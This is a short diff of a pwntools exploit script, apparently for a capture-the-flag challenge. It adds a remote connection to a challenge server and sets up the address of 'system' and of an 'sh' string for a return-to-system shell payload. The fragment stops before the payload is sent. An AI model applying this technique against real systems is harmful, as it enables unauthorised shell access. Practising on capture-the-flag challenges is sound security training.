@@ -2,6 +2,8 @@ from pwn import *
 
 elf = ELF("./3a275d95602b406f97bf8ff78d5255e9")
 io = process("./3a275d95602b406f97bf8ff78d5255e9")
+io = remote("111.198.29.45",33759)
+
 system_addr = p32(elf.symbols[b'system'])
 sh_addr = p32(0x804a024)
 
